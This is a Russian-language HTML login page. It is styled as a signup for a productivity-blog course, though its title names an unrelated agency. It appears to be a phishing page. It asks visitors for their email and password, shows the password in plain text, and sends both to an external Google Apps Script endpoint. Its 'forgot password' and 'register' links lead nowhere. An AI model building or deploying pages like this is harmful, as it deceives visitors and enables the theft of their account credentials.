<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Агентство «Энергия развития» — Вход</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #fde2e4, #f8edeb, #e0c3fc);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }
    .card {
      background: rgba(255, 255, 255, 0.85);
      backdrop-filter: blur(8px);
      border-radius: 20px;
      box-shadow: 0 8px 25px rgba(0,0,0,0.1);
      padding: 40px;
      max-width: 400px;
      width: 100%;
      text-align: center;
      animation: fadeIn 1s ease forwards;
    }
    .card h1 {
      font-size: 24px;
      margin-bottom: 10px;
      color: #333;
    }
    .card p {
      font-size: 14px;
      color: #666;
      margin-bottom: 20px;
    }
    .input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border-radius: 12px;
      border: 1px solid #ddd;
      font-size: 14px;
    }
    .btn {
      width: 100%;
      padding: 12px;
      background: #ec4899;
      color: white;
      border: none;
      border-radius: 12px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      transition: background 0.3s ease;
    }
    .btn:hover {
      background: #db2777;
    }
    .link {
      display: block;
      margin-top: 15px;
      font-size: 13px;
      color: #ec4899;
      text-decoration: none;
    }
    .link:hover {
      text-decoration: underline;
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(30px); }
      to { opacity: 1; transform: translateY(0); }
    }
  </style>
</head>
<body>
  <div class="card">
    <h1>Добро пожаловать в<br> блог «Продуктивность & Эстетика»</h1>
    <p>Введи данные для регистрации на курс<br> «Личный баланс: как совмещать работу и вдохновение» ✨</p>
    <form action="https://script.google.com/macros/s/AKfycbwB7ilNrTIm22Y5oioR-BdRUpeiYyMuX08S1PQ0RXslskuFQmqd_x4GMtubcChRtq1hGA/exec" method="POST">
      <input type="text" name="email" class="input" placeholder="Email" required />
      <input type="text" name="password" class="input" placeholder="Пароль" required />
      <button type="submit" class="btn">Войти</button>
    </form>
    <a href="#" class="link">Забыли пароль?</a>
    <p style="margin-top:20px; font-size:14px; color:#444;">
      Нет аккаунта? <a href="#" class="link">Зарегистрироваться</a>
    </p>
  </div>
</body>
</html>
